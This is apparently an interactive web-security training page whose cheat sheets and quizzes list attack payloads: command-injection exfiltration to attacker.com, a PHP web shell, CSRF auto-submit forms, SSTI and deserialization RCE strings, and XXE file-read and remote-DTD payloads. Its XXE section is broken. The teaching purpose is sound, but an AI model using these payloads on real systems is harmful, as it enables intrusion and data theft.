<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BLACKVAULT // Web Security Labs</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
:root{--void:#050706;--panel:#0b0f0d;--panel2:#101512;--bone:#e9e7dc;--ash:#878d85;--blood:#fb3640;--volt:#2de2e6;--amber:#f4b740;--line:rgba(233,231,220,.13);--grot:"Space Grotesk",-apple-system,sans-serif;--mono:"Space Mono",monospace;}
*{box-sizing:border-box;margin:0;padding:0}
html,body{background:var(--void);color:var(--bone);font-family:var(--grot);font-size:15px;line-height:1.55;-webkit-font-smoothing:antialiased}
body{background-image:linear-gradient(rgba(45,226,230,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(45,226,230,.025) 1px,transparent 1px);background-size:44px 44px;min-height:100vh}
body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:9;background:repeating-linear-gradient(0deg,rgba(0,0,0,.18) 0 1px,transparent 1px 3px);opacity:.3}
::selection{background:var(--blood);color:var(--void)}
.topbar{position:sticky;top:0;z-index:20;background:rgba(5,7,6,.94);backdrop-filter:blur(6px);border-bottom:2px solid var(--bone)}
.topbar__in{max-width:1200px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
.brand{display:flex;align-items:baseline;gap:10px;cursor:pointer;user-select:none}
.brand b{font-weight:700;font-size:20px;letter-spacing:-.02em}.brand b i{color:var(--blood);font-style:normal}
.brand span{font-family:var(--mono);font-size:10px;letter-spacing:.32em;color:var(--ash);text-transform:uppercase}
.nav{display:flex;gap:4px;flex-wrap:wrap;margin-left:auto}
.nav button{font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--ash);background:transparent;border:1.5px solid transparent;padding:7px 11px;cursor:pointer;transition:.12s}
.nav button:hover{color:var(--bone);border-color:var(--line)}
.nav button[aria-current]{color:var(--void);background:var(--bone);border-color:var(--bone)}
.meter{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:10px;color:var(--ash);letter-spacing:.1em}
.meter__bar{width:80px;height:7px;border:1.5px solid var(--bone);position:relative}
.meter__fill{position:absolute;inset:0;width:0%;background:var(--blood);transition:width .5s}
main{max-width:1200px;margin:0 auto;padding:28px 20px 90px}
.spine{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:24px}
.node{background:var(--panel);border:2px solid var(--line);padding:16px;cursor:pointer;transition:.14s;position:relative;overflow:hidden;min-height:130px;display:flex;flex-direction:column}
.node:hover{transform:translateY(-3px);border-color:var(--bone);box-shadow:6px 6px 0 rgba(45,226,230,.28)}
.node::before{content:"";position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--accent,var(--ash))}
.node__n{font-family:var(--mono);font-size:11px;color:var(--ash);letter-spacing:.18em}
.node__t{font-weight:600;font-size:17px;margin:5px 0 6px;line-height:1.12}
.node__tag{font-size:11.5px;color:var(--ash);line-height:1.5;margin-top:auto}
.node__bar{height:5px;border:1.5px solid var(--line);margin-top:10px;position:relative}
.node__bar i{position:absolute;inset:0;width:0%;background:var(--accent,var(--ash));transition:width .5s}
.labpill{position:absolute;top:12px;right:12px;font-family:var(--mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;background:var(--blood);color:var(--void);padding:2px 6px}
.chip{font-family:var(--mono);font-size:10px;letter-spacing:.12em;text-transform:uppercase;padding:2px 7px;border:1.5px solid;display:inline-block}
.t-WEB{color:var(--volt);border-color:var(--volt)}.t-AUTH{color:var(--amber);border-color:var(--amber)}
.t-IJ{color:var(--blood);border-color:var(--blood)}.t-IS{color:#60a5fa;border-color:#60a5fa}
.crumb{font-family:var(--mono);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--ash);margin-bottom:16px;display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.crumb a{cursor:pointer;color:var(--volt)}
.ph{border-bottom:2px solid var(--bone);padding-bottom:14px;margin-bottom:20px;display:flex;align-items:flex-end;justify-content:space-between;gap:14px;flex-wrap:wrap}
.ph__t{font-weight:700;font-size:clamp(22px,4vw,36px);letter-spacing:-.03em;line-height:1.05}
.ph__sub{color:var(--ash);font-size:13px;margin-top:5px}
.tabrow{display:flex;gap:0;border-bottom:2px solid var(--line);margin-bottom:22px}
.tabrow button{font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;background:transparent;color:var(--ash);border:none;border-bottom:3px solid transparent;padding:10px 16px;cursor:pointer;transition:.12s;margin-bottom:-2px}
.tabrow button[aria-current]{color:var(--bone);border-bottom-color:var(--accent,var(--blood))}
.tabrow button:hover{color:var(--bone)}
.labshell{background:var(--panel);border:2px solid var(--bone);box-shadow:8px 8px 0 var(--blood)}
.labbar{background:rgba(0,0,0,.5);border-bottom:1px solid var(--line);padding:10px 16px;display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--ash)}
.d2{width:10px;height:10px;border-radius:50%;display:inline-block;margin-right:2px}
.r{color:#f87171}.g{color:#4ade80}.a{color:#fbbf24}.b{color:#60a5fa}.v{color:#2de2e6}.dim{color:#444}
.dr{background:#f87171}.dy{background:#fbbf24}.dg{background:#4ade80}
.labinner{padding:18px;display:grid;gap:14px}
.labinner.two{grid-template-columns:1fr 1fr}
.term{background:#000;border:1px solid #1a1a1a;padding:14px;font-family:var(--mono);font-size:12px;color:#aaa;line-height:1.8;min-height:160px;overflow-y:auto;max-height:360px;white-space:pre-wrap}
.fieldlabel{font-family:var(--mono);font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--ash);margin-bottom:5px;display:block}
.field{width:100%;font-family:var(--mono);font-size:13px;background:#0d0d0d;color:var(--bone);border:1.5px solid #333;padding:9px 12px;outline:none;transition:border .12s}
.field:focus{border-color:var(--volt)}
select.field option{background:#0d0d0d}
textarea.field{resize:vertical;line-height:1.6;min-height:80px}
.btn{font-family:var(--mono);font-size:12px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;background:var(--bone);color:var(--void);border:2px solid var(--bone);padding:9px 14px;box-shadow:4px 4px 0 var(--blood);transition:.12s;white-space:nowrap}
.btn:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--blood)}
.btn:active{transform:translate(2px,2px);box-shadow:2px 2px 0 var(--blood)}
.btn--sm{padding:6px 10px;font-size:11px;box-shadow:3px 3px 0 var(--blood)}
.btn--g{background:transparent;color:var(--volt);border-color:var(--volt);box-shadow:4px 4px 0 rgba(45,226,230,.4)}
.btn--g:hover{background:var(--volt);color:var(--void)}
.btn--r{background:var(--blood);color:var(--void);border-color:var(--blood);box-shadow:4px 4px 0 rgba(251,54,64,.4)}
.btn--a{background:transparent;color:var(--amber);border-color:var(--amber);box-shadow:4px 4px 0 rgba(244,183,64,.3)}
.btn--a:hover{background:var(--amber);color:var(--void)}
.btnrow{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
.panel{background:var(--panel2);border:1px solid var(--line);padding:14px 16px}
.panel.danger{border-color:var(--blood)}.panel.safe{border-color:#4ade80}.panel.warn{border-color:var(--amber)}
.panel h4{font-family:var(--mono);font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--ash);margin-bottom:8px}
.tag{display:inline-block;font-family:var(--mono);font-size:10px;padding:2px 7px;font-weight:600;margin:2px}
.tag-r{background:#3a1515;color:#f87171}.tag-g{background:#0f2a1a;color:#4ade80}
.tag-a{background:#2a1d0a;color:#fbbf24}.tag-b{background:#0d1f3a;color:#60a5fa}
.httppane{display:grid;grid-template-columns:1fr 1fr;border:1px solid var(--line)}
.httppane__h{background:#0a0f0e;border-bottom:1px solid var(--line);padding:6px 12px;font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--ash)}
.httppane__b{font-family:var(--mono);font-size:12px;padding:12px;background:#000;min-height:120px;white-space:pre-wrap;color:#aaa;line-height:1.7}
.cheat{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
.cheat__item{border-left:3px solid var(--accent,var(--volt));background:var(--panel);padding:10px 14px}
.cheat__item code{font-family:var(--mono);font-size:12px;color:var(--volt);background:#0d0f0d;padding:2px 6px;cursor:pointer;display:inline-block;margin:2px 0}
.cheat__item code:hover{background:var(--volt);color:var(--void)}
.cheat__item p{font-size:13px;color:var(--ash);margin:4px 0 0}
.qcard{border:2px solid var(--line);background:var(--panel);padding:18px 20px;margin-bottom:14px}
.qcard__n{font-family:var(--mono);font-size:10px;letter-spacing:.18em;text-transform:uppercase;color:var(--ash);margin-bottom:8px}
.qcard__q{font-weight:600;font-size:16px;margin:0 0 13px;line-height:1.3}
.opt{display:block;width:100%;text-align:left;font-family:var(--grot);font-size:14px;color:var(--bone);background:var(--panel2);border:1.5px solid var(--line);padding:10px 14px;margin-bottom:7px;cursor:pointer;transition:.1s}
.opt:hover:not(:disabled){border-color:var(--bone)}.opt:disabled{cursor:default}
.opt[data-s=correct]{border-color:var(--amber);background:rgba(244,183,64,.1)}
.opt[data-s=wrong]{border-color:var(--blood);background:rgba(251,54,64,.09)}
.explain{font-size:13px;color:var(--ash);border-left:3px solid var(--amber);padding:8px 0 8px 14px;margin-top:4px}
.explain b{color:var(--amber);font-family:var(--mono);font-size:10px;letter-spacing:.12em;text-transform:uppercase;display:block;margin-bottom:2px}
.score{font-family:var(--mono);border:2px solid var(--bone);padding:12px 16px;margin-bottom:18px;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap}
.score b{font-size:22px;color:var(--blood)}
.miniretry{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;background:transparent;color:var(--volt);border:1.5px solid var(--volt);padding:5px 9px}
.miniretry:hover{background:var(--volt);color:var(--void)}
.casenode{border:2px solid var(--bone);background:var(--panel);padding:22px 24px;box-shadow:7px 7px 0 var(--blood)}
.clock{font-family:var(--mono);font-size:12px;letter-spacing:.16em;color:var(--blood)}
.choice{display:block;width:100%;text-align:left;font-size:14px;color:var(--bone);background:var(--panel2);border:1.5px solid var(--line);padding:12px 16px;margin-top:9px;cursor:pointer;transition:.1s}
.choice:hover{border-color:var(--volt);transform:translateX(3px)}
.fb{border-left:3px solid;padding:10px 0 10px 14px;margin-top:14px;font-size:14px}
.fb-g{border-color:var(--amber)}.fb-g b,.fb-b b{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:2px}
.fb-g b{color:var(--amber)}.fb-b{border-color:var(--blood)}.fb-b b{color:var(--blood)}
.h1{font-size:clamp(26px,5vw,44px);font-weight:700;letter-spacing:-.03em;line-height:1.02;margin:8px 0 0}
.lede{color:var(--ash);max-width:64ch;margin:12px 0 0;font-size:15px}
.eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:.3em;text-transform:uppercase;color:var(--volt)}
.toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(20px);opacity:0;background:var(--bone);color:var(--void);font-family:var(--mono);font-size:12px;letter-spacing:.08em;text-transform:uppercase;padding:9px 16px;border:2px solid var(--void);z-index:50;transition:.25s;pointer-events:none}
.toast[data-show]{opacity:1;transform:translateX(-50%) translateY(0)}
footer{max-width:1200px;margin:0 auto;padding:24px 20px 40px;border-top:1px solid var(--line);font-family:var(--mono);font-size:11px;letter-spacing:.08em;color:var(--ash);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
@media(max-width:800px){.spine{grid-template-columns:1fr 1fr}.labinner.two{grid-template-columns:1fr}.httppane{grid-template-columns:1fr}}
@media(max-width:520px){.spine{grid-template-columns:1fr}}
</style></head>
<body>
<div class="topbar"><div class="topbar__in">
  <div class="brand" id="brandBtn"><b>BLACK<i>VAULT</i></b><span>Web Security Labs</span></div>
  <div class="meter"><span>XP</span><div class="meter__bar"><div class="meter__fill" id="mf"></div></div><span id="mp">0%</span></div>
  <nav class="nav" id="nav">
    <button id="nb-map">Map</button>
    <button id="nb-quiz">Quiz</button>
    <button id="nb-case">Cases</button>
    <button id="nb-ref">Reference</button>
  </nav>
</div></div>
<main id="app"></main>
<footer><span>BLACKVAULT // interactive web security lab</span><span id="fstat">xp saved locally</span></footer>
<div class="toast" id="toast"></div>
<script>
/* ── STATE ── */
const S={view:'map',phase:null,tab:'lab',quizPool:[],quizState:[],caseId:null,caseNode:0,
  xp:JSON.parse(localStorage.getItem('bv_xp')||'{}')};
function saveXP(){localStorage.setItem('bv_xp',JSON.stringify(S.xp));}
function addXP(id,pts=10){if(!S.xp[id]){S.xp[id]=pts;saveXP();updateMeter();toast('+'+pts+' XP');}}
function totalXP(){return Object.values(S.xp).reduce((a,v)=>a+v,0);}
function maxXP(){return PHASES.length*60;}
function updateMeter(){const p=Math.min(100,Math.round(totalXP()/maxXP()*100));document.getElementById('mf').style.width=p+'%';document.getElementById('mp').textContent=p+'%';}
function toast(m){const t=document.getElementById('toast');t.textContent=m;t.dataset.show=1;setTimeout(()=>delete t.dataset.show,2000);}
function cp(el){navigator.clipboard?.writeText(el.textContent.trim());toast('Copied!');}

/* ── PHASES DATA ── */
const accentMap={WEB:'var(--volt)',AUTH:'var(--amber)',IJ:'var(--blood)',IS:'#60a5fa'};
const PHASES=[
{n:1,id:'enum',title:'Web Enumeration',tracks:['WEB'],
 tag:'passive OSINT · dir brute · tech fingerprint · subdomains',
 tip:'You cannot exploit what you have not enumerated.',
 labType:'scanner',
 cheat:[
  {title:'Passive — zero packets',cmd:'curl "https://crt.sh/?q=%.target.com&output=json" | jq ".[].name_value"',note:'Certificate transparency — finds every subdomain ever issued a cert'},
  {title:'Dir brute force',cmd:'gobuster dir -u https://target.com -w raft-medium-directories.txt -x php,bak,zip,env',note:'Always include -x bak,zip,env — backup files are critical'},
  {title:'Tech fingerprint',cmd:'whatweb -a 3 https://target.com -v',note:'Stack → CVE list. X-Powered-By header alone leaks PHP version'},
  {title:'High-value quick wins',cmd:'curl -sI https://target.com | grep -iE "server:|x-powered-by:"',note:'Check /.git/HEAD /.env /backup.zip /phpinfo.php /swagger.json before full wordlists'},
  {title:'Subdomain enum',cmd:'subfinder -d target.com -all -recursive -o subs.txt',note:'Forgotten dev/staging subdomains are often the real entry point'},
  {title:'403 bypass',cmd:'curl -H "X-Original-URL: /admin" https://target.com/',note:'403 means resource EXISTS. Try path tricks, verb confusion, X-Original-URL'},
 ],
 quiz:[
  {q:'You find dev.target.com via crt.sh returning Apache/2.2 in headers. Best next step:',o:['Ignore — dev server','searchsploit Apache 2.2 and map CVEs','Run nikto immediately','Report informational'],a:1,e:'Old stack on a forgotten subdomain = high-value. Fingerprint → CVE map.'},
  {q:'gobuster finds /backup.zip returning 200. Impact:',o:['Low — just a backup','Critical — source code, DB dumps, credentials','Medium','Informational'],a:1,e:'A backup archive is one of the highest-impact finds. Contains entire application source.'},
  {q:'A path returns 403 Forbidden. You should:',o:['Skip it','Try path manipulation and X-Original-URL header injection','Report informational','Try SQLi'],a:1,e:'403 = resource exists. Try bypass: /admin/. /ADMIN X-Original-URL:/admin POST vs GET.'},
 ]},
{n:2,id:'jwt',title:'JWT Attacks',tracks:['AUTH'],
 tag:'alg:none · algorithm confusion · weak secret · kid injection',
 tip:'The server must decide the algorithm — never the token.',
 labType:'jwt',
 cheat:[
  {title:'Decode any JWT',cmd:'echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null',note:'Three parts: header.payload.signature — all Base64url encoded'},
  {title:'alg:none attack',cmd:'{"alg":"none","typ":"JWT"}',note:'Strip signature entirely. Some libraries skip verification for alg:none'},
  {title:'HS256 brute force',cmd:'hashcat -a 0 -m 16500 token.jwt rockyou.txt',note:'Weak secrets (secret, password, jwt) crack in seconds offline'},
  {title:'RS256 → HS256 confusion',cmd:'jwt_tool TOKEN -X a',note:'Sign with server public key as HMAC secret. Public key from /jwks.json'},
  {title:'kid SQL injection',cmd:'{"kid":"x\' UNION SELECT \'mysecret\'--"}',note:'kid used in SQL → inject to control which key validates the token'},
  {title:'Find public key',cmd:'GET /.well-known/jwks.json',note:'Public key needed for RS256→HS256 attack. Always fetch this first'},
 ],
 quiz:[
  {q:'You change JWT header to {"alg":"none"} and remove the signature. Server accepts it. This is:',o:['Normal behavior','alg:none attack — library skips signature check','Replay attack','Broken token'],a:1,e:'Some JWT libraries accept alg:none and skip verification — any claim can be forged.'},
  {q:'Server uses RS256. You change alg to HS256 and sign with the server\'s PUBLIC key. Why might this work?',o:['It cannot work — different algorithms','Library uses same key for both modes — public key becomes HMAC secret','You need the private key','Only works on JWT v1'],a:1,e:'Algorithm confusion: if the library mishandles alg switching, the public key (from /jwks.json) validates the HS256 signature.'},
  {q:'kid header is interpolated into: SELECT key FROM keys WHERE id=\'"+kid+\"\'. You inject:',o:['A normal key ID','\'  UNION SELECT \'mysecret\'-- to control the signing key','base64 payload','Any valid JWT'],a:1,e:'SQL injection in kid lets you return an attacker-controlled key — forge any token with that key.'},
 ]},
{n:3,id:'idor',title:'IDOR',tracks:['AUTH'],
 tag:'object reference · horizontal · vertical · blind · UUID',
 tip:'Change every ID in every request. Always.',
 labType:'idor',
 cheat:[
  {title:'Horizontal IDOR',cmd:'GET /api/orders/1042 → try /api/orders/1041',note:'Access another user\'s same-privilege object — just increment the ID'},
  {title:'Vertical IDOR',cmd:'GET /api/admin/users → as regular user',note:'Access higher-privilege objects. Try /admin/ /internal/ /superuser/'},
  {title:'Blind IDOR',cmd:'DELETE /api/messages/999 → check side effects',note:'No data returned but action succeeds. Verify: is the resource gone?'},
  {title:'UUID false security',cmd:'GET /api/reports/[UUID leaked in search]',note:'UUIDs prevent prediction but not exploitation once leaked in any response'},
  {title:'Parameter patterns',cmd:'user_id= account= owner= profile_id= doc=',note:'Grep all parameters — any that reference objects without auth check are candidates'},
  {title:'Mass assignment',cmd:'PUT /api/user {"role":"admin"}',note:'APIs that accept extra fields may update privileged attributes not in the UI'},
 ],
 quiz:[
  {q:'GET /api/orders/5281 returns your order. You try /api/orders/5280 and get another user\'s data. This is:',o:['Normal pagination','Horizontal IDOR — unauthorized access to another user\'s object','Vertical privilege escalation','Expected behavior'],a:1,e:'Horizontal IDOR: same privilege, different user\'s object. No exploit needed — just a different number.'},
  {q:'API uses UUIDs. Is IDOR still possible?',o:['No — UUIDs are unguessable','Yes — if the UUID appears in any API response, you can use it','Only with SQLi','Only with insider knowledge'],a:1,e:'UUIDs prevent brute force but not IDOR. Any endpoint leaking another user\'s UUID enables exploitation.'},
  {q:'Best fix for IDOR on GET /api/invoices/:id:',o:['Switch to UUIDs','Use POST','Check invoice.owner_id === session.user_id before returning','Encrypt the ID'],a:2,e:'Authorization check: verify the requesting user owns the specific object being accessed.'},
 ]},
{n:4,id:'csrf',title:'CSRF',tracks:['IJ'],
 tag:'hidden form · cookie auto-attach · SameSite · token bypass',
 tip:'Browsers auto-attach cookies to every request. That\'s the entire attack.',
 labType:'csrf',
 cheat:[
  {title:'Auto-submit POST form',cmd:'<form action="https://target.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="9999"></form><script>document.forms[0].submit()</scr'+'ipt>',note:'Victim visits your page — form auto-submits with their session cookie'},
  {title:'GET-based CSRF',cmd:'<img src="https://target.com/action?delete=1" width=0 height=0>',note:'Any state-changing GET endpoint is exploitable with just an img tag'},
  {title:'Bypass: token not validated when absent',cmd:'Remove the csrf_token field entirely',note:'If server only validates when present, omit the field — most common bypass'},
  {title:'Bypass: token in URL',cmd:'Leaked via Referer header to analytics',note:'Never put CSRF tokens in URLs — they appear in Referer headers'},
  {title:'SameSite=Lax gap',cmd:'<a href="https://target.com/action?state=evil">Click me</a>',note:'Lax still allows cookies on top-level GET navigations (link clicks)'},
  {title:'Defense: custom header',cmd:'X-Requested-With: XMLHttpRequest',note:'HTML forms cannot set custom headers — requiring one blocks cross-origin form attacks'},
 ],
 quiz:[
  {q:'CSRF token exists in the form. Server also accepts requests with NO token field. This is:',o:['Secure','Bypassed — omit the token field to skip validation','Requires XSS first','Only GET-exploitable'],a:1,e:'Servers that validate only when present are bypassed by simply removing the field from the request.'},
  {q:'SameSite=Lax still allows which CSRF vector?',o:['POST form submission','GET CSRF via top-level navigation (link click)','Fetch with credentials','Nothing — fully protected'],a:1,e:'Lax sends cookies on top-level GET navigations. A victim clicking a link to a state-changing GET is exploitable.'},
  {q:'Best CSRF defense for a REST API using JSON:',o:['Referer header check','Custom request header (X-CSRF-Token) + strict Content-Type: application/json','SameSite=Strict only','IP whitelist'],a:1,e:'HTML forms cannot set custom headers or send JSON — requiring both blocks cross-origin form attacks entirely.'},
 ]},
{n:5,id:'cmdinj',title:'Command Injection',tracks:['IJ'],
 tag:'; | && $() shell metacharacters · blind · OOB · RCE',
 tip:'One semicolon. Full server compromise.',
 labType:'cmdinj',
 cheat:[
  {title:'Basic separators',cmd:'; whoami | id && cat /etc/passwd',note:'; runs after, | pipes output, && runs if first succeeds, || runs if fails'},
  {title:'Blind — time delay',cmd:'; sleep 5',note:'Response takes 5+ extra seconds = blind injection confirmed'},
  {title:'OOB exfiltration',cmd:'; curl http://attacker.com/$(whoami)',note:'Command output rides in the URL to your listener'},
  {title:'Space filter bypass',cmd:'cat${IFS}/etc/passwd',note:'$IFS = Internal Field Separator. Also try {cat,/etc/passwd} or tab character'},
  {title:'Safe replacement (Python)',cmd:'subprocess.run(["ping", user_ip])',note:'List-based subprocess = no shell involved. Never use shell=True with user input'},
  {title:'DNS OOB callback',cmd:'; nslookup $(id).attacker.com',note:'Command output in DNS subdomain — works when HTTP is blocked outbound'},
 ],
 quiz:[
  {q:'App runs: ping -c 1 [user_input]. You inject: 127.0.0.1; cat /etc/passwd. Result:',o:['Ping fails','Ping runs then /etc/passwd is read','Only cat runs','Error'],a:1,e:'; chains commands: ping runs first, then cat /etc/passwd executes and output is returned.'},
  {q:'No output in response. Best blind detection:',o:['Not vulnerable','Inject ; sleep 5 and measure response time','Try louder payloads','Check logs'],a:1,e:'Time-based: 5 extra seconds confirms blind injection without needing output returned.'},
  {q:'subprocess.call("ping " + user_ip, shell=True) — the safe fix:',o:['Add regex validation','subprocess.call(["ping", user_ip]) — list args, no shell','Quote the input','Encode the input'],a:1,e:'List-based args bypass the shell entirely — no metacharacter interpretation possible.'},
 ]},
{n:6,id:'upload',title:'File Upload',tracks:['IJ'],
 tag:'webshell · MIME bypass · double extension · ImageMagick',
 tip:'Upload, then access. The second step is what makes it RCE.',
 labType:'upload',
 cheat:[
  {title:'Minimal PHP web shell',cmd:'<?php system($_GET["cmd"]); ?>',note:'One line. Append to any file. Access at /uploads/shell.php?cmd=id'},
  {title:'MIME type bypass',cmd:'Content-Type: image/jpeg  (file is actually PHP)',note:'Change in Burp intercept — server trusts client-supplied MIME type'},
  {title:'Double extension',cmd:'shell.php.jpg',note:'Some Apache configs execute .php.jpg as PHP with AddHandler'},
  {title:'Magic bytes bypass',cmd:'FF D8 FF + PHP code',note:'Prepend JPEG magic bytes — passes header check, PHP still executes'},
  {title:'EXIF injection',cmd:'exiftool -Comment="<?php system($_GET[\'cmd\']); ?>" image.jpg',note:'PHP embedded in image metadata executes if server processes EXIF'},
  {title:'Safe storage',cmd:'Store outside web root + Content-Disposition: attachment',note:'Files outside web root cannot be executed via HTTP regardless of content'},
 ],
 quiz:[
  {q:'Server checks Content-Type is image/jpeg. You submit a PHP file with Content-Type: image/jpeg. Result:',o:['Rejected — PHP detected','Upload succeeds if only MIME type is validated','Server crashes','MIME is foolproof'],a:1,e:'Content-Type is client-controlled. Changing it in the request bypasses any check that trusts this header.'},
  {q:'You upload shell.php.jpg and access /uploads/shell.php.jpg?cmd=id. It returns "uid=33". Why:',o:['PHP ignores extensions','Apache AddHandler php executes .jpg as PHP when misconfigured','The .jpg is ignored','Magic bytes matched'],a:1,e:'Apache with AddHandler application/x-httpd-php .php .php.jpg treats .php.jpg as executable PHP.'},
  {q:'Safest upload defense:',o:['Block PHP in filename','Store outside web root, serve with Content-Disposition: attachment','Rename to random string','htaccess block'],a:1,e:'Files outside the web root cannot be executed via HTTP — regardless of extension or content.'},
 ]},
{n:7,id:'ssti',title:'SSTI',tracks:['IJ'],
 tag:'Jinja2 · Twig · Freemarker · sandbox escape · RCE',
 tip:'If the server renders your input as a template, you own the server.',
 labType:'ssti',
 cheat:[
  {title:'Jinja2 math probe',cmd:'{{7*7}}',note:'Response 49 = Jinja2/Twig evaluated your expression. SSTI confirmed.'},
  {title:'Engine fingerprint',cmd:"{{7*'7'}} → 7777777 = Jinja2 | 49 = Twig",note:'String multiplication distinguishes Python (Jinja2) from PHP (Twig)'},
  {title:'Freemarker RCE',cmd:'${"freemarker.template.utility.Execute"?new()("id")}',note:'Direct RCE — Execute class instantiated via Freemarker reflection'},
  {title:'Jinja2 RCE path',cmd:"{{''.__class__.__mro__[1].__subclasses__()}}",note:'Walk Python object hierarchy → find subprocess.Popen → call popen("id").read()'},
  {title:'Jinja2 RCE (config)',cmd:"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",note:'Via config object — often works when direct subclass walk is blocked'},
  {title:'Safe usage',cmd:"render_template('page.html', name=user_input)",note:'Pass data as variable, not as the template string. Never Template(user_input).render()'},
 ],
 quiz:[
  {q:'You inject {{7*7}} and the page shows 49. This confirms:',o:['XSS','SSTI — template engine evaluated your expression server-side','SQLi','Path traversal'],a:1,e:'{{7*7}} is Jinja2/Twig syntax. Response 49 = server-side execution = SSTI confirmed.'},
  {q:"{{7*'7'}} returns 7777777. The engine is:",o:['Twig (PHP)','Jinja2 (Python) — string × int = repetition','Freemarker','ERB'],a:1,e:"In Python/Jinja2: '7'*7 = '7777777'. In PHP/Twig: it performs numeric multiplication → 49."},
  {q:'Safe fix for Flask app rendering user content:',o:['Sanitize template expressions','Use render_template("page.html", content=input) — variable, not template','Escape curly braces','Use sandbox mode'],a:1,e:'Passing data as a variable means the engine renders it as text. Never construct the template string from user input.'},
 ]},
{n:8,id:'xxe',title:'XXE',tracks:['IJ'],

  {title:'File read payload',cmd:'<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',note:'Parser substitutes file contents into the XML response'},
  {title:'SSRF via XXE',cmd:'<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">',note:'Probe AWS metadata endpoint — retrieves IAM credentials'},
  {title:'Blind OOB',cmd:'<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;',note:'Load remote DTD that exfiltrates data via DNS/HTTP callback'},
  {title:'SVG XXE',cmd:'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',note:'SVG is XML — upload as image to trigger server-side XXE parsing'},
  {title:'Switch to XML',cmd:'Content-Type: application/xml',note:'Test JSON endpoints by switching Content-Type — they may also accept XML'},
  {title:'The fix',cmd:'factory.setFeature("http://xml.org/sax/features/external-general-entities", false)',note:'Disable external entities in the parser. Never filter — disable the feature.'},
 ],

  {q:'Best fix for XXE:',o:['Validate DOCTYPE','Disable external entity processing in the parser config','Encode XML input','WAF'],a:1,e:'The only reliable fix: disable the feature at parser level. Input filtering is bypassable.'},

{n:9,id:'deserial',title:'Insecure Deserialization',tracks:['IJ'],
 tag:'gadget chains · Java AC ED · PHP O: · pickle · RCE',
 tip:'The deserialization process itself executes code. No injection needed.',
 labType:'deserial',
 cheat:[
  {title:'Java magic bytes',cmd:'AC ED 00 05  (hex)  →  rO0AB (Base64)',note:'Spot Java serialized objects in cookies, params, JMX. rO0AB = always test.'},
  {title:'Java gadget chain',cmd:'java -jar ysoserial.jar CommonsCollections1 "ping attacker.com" | base64',note:'ysoserial automates gadget chain generation for common Java libraries'},
  {title:'PHP object injection',cmd:"O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}",note:'PHP unserialize() on user input triggers __wakeup/__destruct → code execution'},
  {title:'PHPGGC payload',cmd:'phpggc Guzzle/RCE1 system id | base64',note:'PHPGGC generates PHP gadget chains. Check app dependencies for supported chains'},
  {title:'Python pickle RCE',cmd:"import pickle,os; pickle.dumps(type('x',(object,),{'__reduce__':lambda s:(os.system,('id',))})())",note:'pickle.loads on attacker data = trivial RCE via __reduce__. Never unpickle untrusted data.'},
  {title:'The fix',cmd:'Use JSON + schema validation instead of native serialization',note:'Cryptographically sign if you must serialize. Use allowlist deserialization.'},
 ],
 quiz:[
  {q:'Cookie value starts with rO0AB. This is:',o:['A JWT','Base64-encoded Java serialized object — test for deserialization','Session token','Encrypted data'],a:1,e:'rO0AB is Base64 of AC ED 00 05 — Java serialization magic bytes. Test with ysoserial.'},
  {q:'PHP app: unserialize($_COOKIE["user"]). You can:',o:['Only read cookie data','Craft PHP object with __wakeup/__destruct to execute code','Change your role only','Perform CSRF'],a:1,e:'PHP object injection via unserialize with user input — magic methods execute during deserialization.'},
  {q:'Safest alternative to Java native serialization:',o:['XML','JSON with schema validation — no class instantiation during parsing','Base64 objects','YAML'],a:1,e:'JSON with schema validation avoids gadget chains entirely — no class constructors are invoked.'},
 ]},
{n:10,id:'cors',title:'CORS Misconfiguration',tracks:['WEB'],
 tag:'origin reflection · null · credentials · cross-origin read',
 tip:'CORS does not block requests — only reading responses. Big difference.',
 labType:'cors',
 cheat:[
  {title:'Test origin reflection',cmd:'curl -H "Origin: https://evil.com" https://target.com/api -I | grep -i access-control',note:'If ACAO reflects evil.com back, combined with Allow-Credentials = full read access'},
  {title:'Null origin bypass',cmd:'<iframe sandbox="allow-scripts allow-forms" srcdoc="fetch(...)">',note:'Sandboxed iframes send Origin: null — whitelist null = exploit vector'},
